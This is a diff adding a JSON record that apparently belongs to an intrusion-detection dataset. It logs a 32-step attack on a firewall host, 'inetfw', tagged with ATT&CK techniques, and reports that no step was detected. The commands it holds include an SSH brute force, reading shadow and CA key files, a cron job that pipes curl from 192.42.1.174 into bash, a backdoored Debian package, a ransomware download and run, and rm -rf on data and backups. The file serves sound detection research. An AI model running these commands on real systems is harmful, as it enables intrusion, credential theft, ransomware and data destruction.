@@ -1,0 +1,310 @@
+{
+ "scenario": "scenario_3_ssh_apt",
+ "victim": "inetfw",
+ "n_events": 5,
+ "files": [
+  {
+   "file": "<CAM-LDS>/s3/scenario_3_ssh_apt/inetfw/logs/log/auth.log",
+   "kind": "auth",
+   "events": 5
+  }
+ ],
+ "steps": [
+  {
+   "ts": "2025-12-12T10:28:22+00:00",
+   "kind": "Shell-Command",
+   "cmd": "hydra -C user_pass_combo.txt -s 10022 fw.attackbed.com ssh",
+   "tech": "T1078.002,T1110.001,T1133",
+   "tactic": "Initial Access",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:28:43+00:00",
+   "kind": "SSH-Command",
+   "cmd": "id",
+   "tech": "T1078.002",
+   "tactic": "Initial Access",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:28:59+00:00",
+   "kind": "SSH-Command",
+   "cmd": "tcpdump -A port 21 ",
+   "tech": "T1040",
+   "tactic": "Credential Access",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:29:50+00:00",
+   "kind": "SSH-Command",
+   "cmd": "sudo -i ",
+   "tech": "T1078.003",
+   "tactic": "Privilege Escalation",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:30:05+00:00",
+   "kind": "SSH-Command",
+   "cmd": "rambo ",
+   "tech": "T1078.003",
+   "tactic": "Privilege Escalation",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:30:35+00:00",
+   "kind": "SSH-Command",
+   "cmd": "cat /etc/shadow ",
+   "tech": "T1003.008",
+   "tactic": "Credential Access",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:30:50+00:00",
+   "kind": "SSH-Command",
+   "cmd": "cat /etc/puppetlabs/puppetserver/ca/ca_key.pem ",
+   "tech": "T1213",
+   "tactic": "Collection",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:31:05+00:00",
+   "kind": "SSH-Command",
+   "cmd": "cat /media/share/healthcheck_cron.sh ",
+   "tech": "T1039",
+   "tactic": "Collection",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:32:30+00:00",
+   "kind": "SSH-Command",
+   "cmd": "ls -l /var/www/html/debian ",
+   "tech": "T1083",
+   "tactic": "Discovery",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:32:45+00:00",
+   "kind": "SSH-Command",
+   "cmd": "apt update && apt install -y dpkg-dev ",
+   "tech": "T1059.004",
+   "tactic": "Execution",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:33:20+00:00",
+   "kind": "SSH-Command",
+   "cmd": "mkdir /tmp/.tmux_data ",
+   "tech": "T1036.005,T1564.001 ",
+   "tactic": "Defense Evasion",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:33:50+00:00",
+   "kind": "SSH-Command",
+   "cmd": "dpkg-deb -R /var/www/html/debian/healthcheckd_1.0-1_amd64.deb healthcheckd ",
+   "tech": "T1574",
+   "tactic": "Persistence,Defense Evasion",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:34:35+00:00",
+   "kind": "SSH-Command",
+   "cmd": ":%s/1.0-1/1.0-2/g ",
+   "tech": "T1059,T1574",
+   "tactic": "Execution",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:35:05+00:00",
+   "kind": "SSH-Command",
+   "cmd": ":wq ",
+   "tech": "T1059,T1574",
+   "tactic": "Execution",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:36:50+00:00",
+   "kind": "SSH-Command",
+   "cmd": "echo '*/5 * * * * root /usr/bin/curl http://192.42.1.174:8888/install.sh | /bin/bash' > /etc/cron.d/health",
+   "tech": "T1053.003,T1105,T1071.001 ",
+   "tactic": "Persistence,Command and Control",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:37:50+00:00",
+   "kind": "SSH-Command",
+   "cmd": ":wq ",
+   "tech": "T1053.003,T1105,T1071.001 ",
+   "tactic": "Persistence,Command and Control",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:38:20+00:00",
+   "kind": "SSH-Command",
+   "cmd": "dpkg-deb -b healthcheckd /var/www/html/debian/healthcheckd_1.0-2_amd64.deb ",
+   "tech": "T1072",
+   "tactic": "Execution,Lateral Movement",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:38:51+00:00",
+   "kind": "SSH-Command",
+   "cmd": "dpkg-scanpackages . | gzip -c9  > Packages.gz ",
+   "tech": "T1072",
+   "tactic": "Execution,Lateral Movement",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:45:39+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "shell",
+   "tech": "T1059",
+   "tactic": "Execution",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:45:56+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\";",
+   "tech": "T1059",
+   "tactic": "Execution",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:46:12+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "export SHELL=bash",
+   "tech": "T1059",
+   "tactic": "Execution",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:46:29+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "export TERM=xterm256-color",
+   "tech": "T1059",
+   "tactic": "Execution",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:46:45+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "stty rows 38 columns 116",
+   "tech": "T1059",
+   "tactic": "Execution",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:47:01+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "export PS1=\"PWN >\"",
+   "tech": "T1059",
+   "tactic": "Execution",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:47:18+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "curl http://192.42.1.174/donotcry > /opt/donotcry",
+   "tech": "T1486,T1105",
+   "tactic": "Impact,Command and Control",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:47:34+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "/lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images",
+   "tech": "T1486,T1565.001",
+   "tactic": "Impact",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:47:50+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "find /media/data/Images",
+   "tech": "T1018",
+   "tactic": "Discovery",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:48:07+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "cat /etc/passwd",
+   "tech": "T1087.001",
+   "tactic": "Discovery",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:48:23+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "userdel -f john",
+   "tech": "T1531",
+   "tactic": "Impact",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:48:39+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "rm -rf /media/data/*",
+   "tech": "T1485",
+   "tactic": "Impact",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:48:56+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "rm -rf /var/backups/*",
+   "tech": "T1490",
+   "tactic": "Impact",
+   "rules": [],
+   "visible": false
+  },
+  {
+   "ts": "2025-12-12T10:49:12+00:00",
+   "kind": "Msf-Session-Command",
+   "cmd": "systemctl stop exim4.service",
+   "tech": "T1489",
+   "tactic": "Impact",
+   "rules": [],
+   "visible": false
+  }
+ ],
+ "flag_before_attack": 0,
+ "flag_before_attack_rules": [],
+ "summary": {
+  "steps": 32,
+  "detected": 0,
+  "visible": 0,
+  "visible_detected": 0
+ }
+}
